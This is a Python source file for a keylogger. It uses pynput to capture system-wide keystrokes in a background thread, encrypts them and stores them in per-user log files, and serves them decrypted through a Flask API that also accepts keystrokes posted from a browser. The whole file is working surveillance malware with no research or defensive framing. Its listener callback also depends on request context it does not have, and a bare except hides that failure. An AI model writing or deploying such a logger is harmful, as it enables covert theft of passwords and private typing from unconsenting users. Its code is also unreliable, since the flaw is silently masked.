from pynput import keyboard
from cryptography.fernet import Fernet
from flask import Flask, render_template, request, jsonify, session
import datetime
import os
import threading
import uuid

BUFFER_SIZE = 10
KEY_FILE_NAME = "secret.key"
USERS_LOG_FOLDER = "logs"
buffer = []

if not os.path.exists(KEY_FILE_NAME):
    key = Fernet.generate_key()
    with open(KEY_FILE_NAME, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE_NAME, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)
app = Flask(__name__)
app.secret_key = os.urandom(24)

def get_user_folder(user_id):
    folder = os.path.join(USERS_LOG_FOLDER, user_id)
    if not os.path.exists(folder):
        os.makedirs(folder)
    return folder

def get_log_file_name(user_id):
    user_folder = get_user_folder(user_id)
    now = datetime.datetime.now()
    filename = now.strftime("%Y-%m-%d_%H.txt")
    return os.path.join(user_folder, filename)

def on_press(key):
    global buffer
    user_id = session.get("user_id", "default_user")
    try:
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char:
            text = f"{time_str} - {key.char}"
        else:
            text = f"{time_str} - [{key.name}]"
        encrypted = fernet.encrypt(text.encode())
        buffer.append(encrypted)
        if len(buffer) >= BUFFER_SIZE:
            log_file_name = get_log_file_name(user_id)
            with open(log_file_name, "ab") as f:
                f.write(b"\n".join(buffer) + b"\n")
            buffer.clear()
    except:
        pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

@app.before_request
def assign_user_id():
    if "user_id" not in session:
        session["user_id"] = str(uuid.uuid4())

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/keystrokes", methods=["GET"])
def get_keystrokes():
    user_id = session.get("user_id")
    logs = []
    user_folder = get_user_folder(user_id)
    if os.path.exists(user_folder):
        for file_name in os.listdir(user_folder):
            file_path = os.path.join(user_folder, file_name)
            with open(file_path, "rb") as f:
                for line in f:
                    try:
                        decrypted = fernet.decrypt(line.strip()).decode()
                        time_stamp, key_char = decrypted.split(" - ", 1)
                        logs.append({"key": key_char, "timestamp": time_stamp})
                    except:
                        pass
    return jsonify(logs)

@app.route("/api/keystrokes", methods=["POST"])
def log_keystroke_api():
    user_id = session.get("user_id")
    keystroke_data = request.json
    key_char = keystroke_data.get('key_char')
    timestamp = keystroke_data.get('timestamp')
    if key_char and timestamp:
        text = f"{timestamp} - {key_char}"
        encrypted = fernet.encrypt(text.encode())
        log_file_name = get_log_file_name(user_id)
        with open(log_file_name, "ab") as f:
            f.write(encrypted + b"\n")
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error", "message": "Invalid data"}), 400

if __name__ == "__main__":
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()
    app.run(port=8000, debug=True)
